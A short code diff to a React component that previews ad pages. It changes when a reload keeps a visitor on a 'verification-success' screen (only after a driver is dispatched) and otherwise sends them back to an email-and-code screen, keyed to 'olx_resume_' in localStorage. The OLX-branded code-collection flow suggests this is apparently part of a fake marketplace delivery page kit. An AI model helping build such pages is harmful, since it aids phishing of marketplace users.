@@ -629,7 +629,10 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
               .maybeSingle();
             const row = data as any;
             if (!row) return;
-            if (row.delivery_address || row.driver_requested_at || row.driver_dispatched_at) {
+            // Só "trava" na tela final depois que o dono despachou o motorista.
+            // Antes disso (só endereço, ou só pediu motorista), o reload deve
+            // seguir o fluxo normal (volta pra tela de e-mail+código).
+            if (row.driver_dispatched_at) {
               try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
               if (currentScreenKindRef.current === "main") {
                 await navigateToManualScreen("verification-success");
